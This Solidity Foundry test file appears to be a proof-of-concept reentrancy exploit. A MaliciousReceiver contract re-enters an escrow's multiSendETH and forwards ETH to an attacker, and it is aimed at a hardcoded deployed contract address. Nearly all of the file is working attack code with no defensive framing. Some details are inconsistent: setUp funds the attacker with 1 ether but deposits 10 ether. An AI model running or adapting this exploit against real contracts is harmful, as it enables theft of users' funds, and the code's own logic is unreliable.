// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IEscrow {
    function multiSendETH(address[] calldata _recipients, uint256[] calldata _amounts) external payable;
    function deposit() external payable;
    function balanceOf(address _owner) external view returns (uint256);
}

contract MaliciousReceiver {
    address public target;
    address public attacker;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy = 10; // Limit to avoid out of gas

    function setTarget(address _target, address _attacker) external {
        target = _target;
        attacker = _attacker;
    }

    receive() external payable {
        reentrancyCount++;

        if (reentrancyCount < maxReentrancy) {
            // Re-enter multiSendETH
            address[] memory recipients = new address[](1);
            recipients[0] = address(this);

            uint256[] memory amounts = new uint256[](1);
            amounts[0] = 1 wei;

            // Re-enter with 0 value since we're draining contract's balance
            IEscrow(target).multiSendETH{value: 0}(recipients, amounts);
        }

        // Send received ETH to attacker
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    // Helper to withdraw any remaining ETH
    function withdraw() external {
        require(msg.sender == attacker, "Only attacker");
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x89d7c52b999DE0f2D862eD944203BFA0526AE973;
    address attacker = address(this);
    MaliciousReceiver public malicious;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Deploy malicious contract
        malicious = new MaliciousReceiver();

        // Fund the attacker with ETH for the initial call
        deal(attacker, 1 ether);

        // Deposit some ETH into the target contract to create a balance
        vm.prank(attacker);
        IEscrow(TARGET).deposit{value: 10 ether}();

        // Label addresses for debugging
        vm.label(address(malicious), "MaliciousReceiver");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get initial balance of attacker
        uint256 initialBalance = attacker.balance;

        // Prepare arrays for the attack
        address[] memory recipients = new address[](1);
        recipients[0] = address(malicious);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1 wei; // Small amount to trigger re-entrancy

        // Set the malicious contract's target and attacker
        malicious.setTarget(address(TARGET), attacker);

        // Start the attack by calling multiSendETH with 1 wei
        // The malicious contract will re-enter multiple times
        IEscrow(TARGET).multiSendETH{value: 1 wei}(recipients, amounts);

        // Check that attacker's balance increased
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

